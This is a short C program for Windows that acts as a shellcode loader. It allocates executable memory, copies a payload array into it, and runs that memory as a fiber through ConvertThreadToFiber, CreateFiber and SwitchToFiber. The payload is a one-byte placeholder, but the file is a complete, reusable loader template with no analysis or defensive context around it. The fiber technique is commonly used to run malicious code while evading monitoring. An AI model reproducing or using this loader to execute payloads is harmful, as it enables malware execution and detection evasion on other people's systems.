#include <windows.h>

unsigned char my_payload[]   = { 0x00 };
unsigned int  my_payload_len = sizeof(my_payload);

int main()
{
	PVOID f;
	PVOID payload_mem;
	PVOID payloadF;

	f = ConvertThreadToFiber(NULL);
	payload_mem = VirtualAlloc(0, my_payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(payload_mem, my_payload, my_payload_len);
	
	payloadF = CreateFiber(NULL, (LPFIBER_START_ROUTINE)payload_mem, NULL);
	SwitchToFiber(payloadF);
	return 0; 
}

